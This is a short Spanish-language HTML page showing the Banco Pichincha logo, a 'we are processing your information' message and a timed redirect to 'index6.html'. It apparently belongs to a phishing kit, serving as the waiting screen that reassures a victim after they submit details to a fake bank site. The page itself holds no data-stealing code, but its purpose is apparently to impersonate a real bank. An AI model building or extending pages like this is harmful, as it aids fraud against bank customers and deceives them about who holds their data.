<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Procesando</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{
  background:#fff;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

.container{
  text-align:center;
}

.logo{
  width:100px;
  animation: fade 2s infinite;
}

.text{
  margin-top:25px;
  font-size:18px;
  font-weight:600;
  color:#0b2a5b;
}

.subtext{
  margin-top:10px;
  font-size:14px;
  color:#5a5a5a;
}

/* Animación aparecer / desaparecer */
@keyframes fade{
  0%{opacity:0}
  50%{opacity:1}
  100%{opacity:0}
}
</style>
</head>

<body>

<div class="container">
  <!-- LOGO -->
  <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/Banco-Pichincha.png" class="logo">

  <div class="text">Estamos procesando tu información</div>
  <div class="subtext">Por favor espera unos segundos…</div>
</div>

<script>
setTimeout(() => {
  window.location.href = "index6.html";
}, 7000); // 7 segundos
</script>

</body>
</html>
